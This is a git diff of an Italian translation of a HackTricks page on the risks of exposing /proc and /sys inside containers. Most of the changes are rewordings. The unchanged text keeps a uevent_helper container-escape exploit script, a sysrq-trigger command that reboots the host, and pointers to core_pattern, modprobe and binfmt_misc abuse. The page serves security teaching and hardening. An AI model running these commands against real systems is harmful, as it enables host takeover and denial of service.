@@ -2,23 +2,23 @@
 
 <details>
 
-<summary><strong>Impara l'hacking AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Altri modi per supportare HackTricks:
 
-* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
 * Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.
+* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
-<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
-L'esposizione di `/proc` e `/sys` senza un'adeguata isolamento dei namespace introduce rischi significativi per la sicurezza, tra cui l'ingrandimento della superficie di attacco e la divulgazione di informazioni. Queste directory contengono file sensibili che, se configurati in modo errato o accessibili da un utente non autorizzato, possono portare alla fuga del container, alla modifica dell'host o fornire informazioni che facilitano ulteriori attacchi. Ad esempio, il montaggio non corretto di `-v /proc:/host/proc` può aggirare la protezione di AppArmor a causa della sua natura basata sul percorso, lasciando `/host/proc` non protetto.
+L'esposizione di `/proc` e `/sys` senza un'adeguata isolamento dei namespace introduce rischi significativi per la sicurezza, inclusa l'espansione della superficie di attacco e la divulgazione di informazioni. Queste directory contengono file sensibili che, se configurati in modo errato o accessibili da un utente non autorizzato, possono portare alla fuga del container, alla modifica dell'host o fornire informazioni che facilitano ulteriori attacchi. Ad esempio, il montaggio non corretto di `-v /proc:/host/proc` può eludere la protezione di AppArmor a causa della sua natura basata sul percorso, lasciando `/host/proc` non protetto.
 
 **Puoi trovare ulteriori dettagli su ciascuna vulnerabilità potenziale in** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
 
@@ -31,7 +31,7 @@ Questa directory consente l'accesso per modificare le variabili del kernel, di s
 #### **`/proc/sys/kernel/core_pattern`**
 
 * Descritto in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-* Consente di definire un programma da eseguire alla generazione del file core con i primi 128 byte come argomenti. Ciò può portare all'esecuzione di codice se il file inizia con un pipe `|`.
+* Consente di definire un programma da eseguire alla generazione del file core con i primi 128 byte come argomenti. Ciò può portare all'esecuzione del codice se il file inizia con un pipe `|`.
 *   **Esempio di test ed exploit**:
 
 ```bash
@@ -53,20 +53,20 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Controlla l'accesso a modprobe
 
 #### **`/proc/sys/vm/panic_on_oom`**
 
-* Citato in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+* Referenziato in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 * Un flag globale che controlla se il kernel va in panico o invoca l'OOM killer quando si verifica una condizione OOM.
 
 #### **`/proc/sys/fs`**
 
 * Come da [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contiene opzioni e informazioni sul file system.
-* L'accesso in scrittura può consentire vari attacchi di negazione del servizio contro l'host.
+* L'accesso in scrittura può abilitare vari attacchi di negazione del servizio contro l'host.
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
 * Consente di registrare interpreti per formati binari non nativi in base al loro numero magico.
-* Può portare a escalation dei privilegi o accesso alla shell di root se `/proc/sys/fs/binfmt_misc/register` è scrivibile.
-* Esploito e spiegato in modo dettagliato:
-* [Rootkit da pover'uomo tramite binfmt\_misc](https://github.com/toffan/binfmt\_misc)
+* Può portare a un'escalation dei privilegi o all'accesso alla shell di root se `/proc/sys/fs/binfmt_misc/register` è scrivibile.
+* Esploito e spiegazione rilevanti:
+* [Rootkit dell'uomo povero tramite binfmt\_misc](https://github.com/toffan/binfmt\_misc)
 * Tutorial approfondito: [Link al video](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
 ### Altri in `/proc`
@@ -78,7 +78,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Controlla l'accesso a modprobe
 
 #### **`/proc/sysrq-trigger`**
 
-* Consente di invocare comandi Sysrq, causando potenzialmente riavvii immediati del sistema o altre azioni critiche.
+* Consente di invocare comandi Sysrq, potenzialmente causando riavvii immediati del sistema o altre azioni critiche.
 *   **Esempio di riavvio dell'host**:
 
 ```bash
@@ -93,7 +93,7 @@ echo b > /proc/sysrq-trigger # Riavvia l'host
 #### **`/proc/kallsyms`**
 
 * Elenca i simboli esportati dal kernel e i loro indirizzi.
-* Fondamentale per lo sviluppo di exploit del kernel, specialmente per superare il KASLR.
+* Essenziale per lo sviluppo di exploit del kernel, specialmente per superare KASLR.
 * Le informazioni sugli indirizzi sono limitate con `kptr_restrict` impostato su `1` o `2`.
 * Dettagli in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
@@ -122,12 +122,12 @@ echo b > /proc/sysrq-trigger # Riavvia l'host
 
 #### **`/proc/sched_debug`**
 
-* Restituisce informazioni sulla pianificazione dei processi, aggirando le protezioni dello spazio dei PID.
+* Restituisce informazioni sulla pianificazione dei processi, eludendo le protezioni dello spazio dei nomi PID.
 * Espone nomi dei processi, ID e identificatori cgroup.
 
 #### **`/proc/[pid]/mountinfo`**
 
-* Fornisce informazioni sui punti di mount nel namespace di mount del processo.
+* Fornisce informazioni sui punti di mount nello spazio dei mount del processo.
 * Espone la posizione del `rootfs` o dell'immagine del container. 
 
 ### Vulnerabilità di `/sys`
@@ -138,23 +138,23 @@ echo b > /proc/sysrq-trigger # Riavvia l'host
 * Scrivere su `/sys/kernel/uevent_helper` può eseguire script arbitrari al verificarsi dei `uevent`.
 *   **Esempio di exploit**: %%%bash
 
-## Crea un payload
+### Crea un payload
 
 echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-## Trova il percorso dell'host dal mount OverlayFS per il container
+### Trova il percorso dell'host dal mount OverlayFS per il container
 
 host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)
 
-## Imposta uevent\_helper su un helper maligno
+### Imposta uevent\_helper su un helper malizioso
 
 echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper
 
-## Attiva un uevent
+### Attiva un uevent
 
 echo change > /sys/class/mem/null/uevent
 
-## Legge l'output
+### Legge l'output
 
 cat /output %%%
 #### **`/sys/class/thermal`**
@@ -167,7 +167,7 @@ cat /output %%%
 
 #### **`/sys/kernel/security`**
 
-* Contiene l'interfaccia `securityfs`, permettendo la configurazione dei Moduli di Sicurezza Linux come AppArmor.
+* Contiene l'interfaccia `securityfs`, consentendo la configurazione dei Moduli di Sicurezza Linux come AppArmor.
 * L'accesso potrebbe consentire a un container di disabilitare il suo sistema MAC.
 
 #### **`/sys/firmware/efi/vars` e `/sys/firmware/efi/efivars`**
@@ -186,7 +186,7 @@ cat /output %%%
 * [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
 * [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)
 
-<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
